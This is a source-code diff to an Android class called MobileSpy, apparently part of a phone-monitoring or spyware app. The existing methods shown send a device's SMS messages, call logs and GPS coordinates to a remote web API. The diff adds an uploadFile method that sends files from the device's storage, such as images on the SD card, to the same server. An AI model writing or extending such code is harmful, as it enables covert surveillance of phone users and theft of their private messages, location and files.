@@ -1,6 +1,7 @@
 package org.ddth.android.mobilespy;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -13,6 +14,7 @@ import org.ddth.http.core.ConnectionListener;
 import org.ddth.http.core.Logger;
 import org.ddth.http.core.connection.ConnectionModel;
 import org.ddth.http.core.connection.Request;
+import org.ddth.http.impl.connection.HttpMultipartRequest;
 import org.ddth.http.impl.connection.ThreadPoolConnectionModel;
 
 public class MobileSpy {
@@ -85,7 +87,8 @@ public class MobileSpy {
 	}
 	
 	public static void logSMS(final String date, final String time, final String from, final String to, final String message) {
-		// Try to login if the session is not available
+		// FIXME Duplicated code but not found a nice way to resolve yet :(
+		// Try to login if the session is not available.
 		if (session.length() == 0) {
 			login(new ContentHandler() {
 				@Override
@@ -107,6 +110,7 @@ public class MobileSpy {
 	public static void logCall(final String date, final String time, final String from,
 			final String to, final String duration, final String type)
 	{
+		// FIXME Duplicated code but not found a nice way to resolve yet :(
 		// Try to login if the session is not available 
 		if (session.length() == 0) {
 			login(new ContentHandler() {
@@ -127,6 +131,7 @@ public class MobileSpy {
 	}
 
 	public static void logGPS(final String lon, final String lat, final String speed, final String dir, final String date, final String time) {
+		// FIXME Duplicated code but not found a nice way to resolve yet :(
 		// Try to login if the session is not available 
 		if (session.length() == 0) {
 			login(new ContentHandler() {
@@ -145,7 +150,39 @@ public class MobileSpy {
 						"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time)));
 		Logger.getDefault().debug(lon + " " + lat + " " + speed + " " + dir + " " + date + " " + time);
 	}
-
+	
+	/**
+	 * Upload the given file to server via web API.
+	 * HTML multipart-form: <input type="file" name="file" id="file" /> 
+	 * 
+	 * @param file File to upload (i.e new File("/sdcard/image.png"))
+	 * @param resourceType Type of uploading file (audio, video, image, music, text, other)
+	 */
+	public static void uploadFile(final File file, final String resourceType) {
+		// FIXME Duplicated code but not found a nice way to resolve yet :(
+		// Try to login if the session is not available
+		if (session.length() == 0) {
+			login(new ContentHandler() {
+				@Override
+				public void handle(String text) {
+					if (session.length() > 0) {
+						uploadFile(file, resourceType);
+					}
+				}
+			});
+			return;
+		}
+		Map<String, String> parameters = new HashMap<String, String>();
+		parameters.put("sID", session);
+		parameters.put("username", username);
+		parameters.put("type", resourceType);
+		parameters.put("file", null);
+		Request req = new HttpMultipartRequest(WEBAPI_SERVER_ROOT + "/uploadFile.php", parameters, file);
+		
+		sendRequest(DO_NOTHING_HANDLER, req);
+		Logger.getDefault().debug("Upload file " + file + " to server");
+	}
+	
 	private static void sendRequest(final ContentHandler handler, Request request) {
 		ConnectionModel connection = new ThreadPoolConnectionModel(new ConnectionListener() {
 			@Override
